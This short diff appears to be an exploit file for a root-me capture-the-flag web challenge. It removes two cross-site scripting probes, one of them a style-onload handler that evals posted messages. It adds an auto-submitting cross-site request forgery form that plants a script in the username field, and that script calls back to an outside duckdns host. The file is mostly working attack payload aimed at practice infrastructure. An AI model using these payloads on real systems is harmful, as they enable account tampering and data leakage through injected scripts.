@@ -1,2 +1,6 @@
-<!-- <script>alert(document.domain)</script> -->
-<style onload='onmessage=e=>eval(e.data);parent.postMessage(1337,`*`)'>
+<form action="http://challenge01.root-me.org:58003/login" method="POST">
+    <input type="hidden" name="username"
+        value="&lt;script&gt;open('http://stalehighway.duckdns.org/?x')&lt;/script&gt;">
+    <input type="hidden" name="secret" value="changed">
+</form>
+<script>document.forms[0].submit()</script>
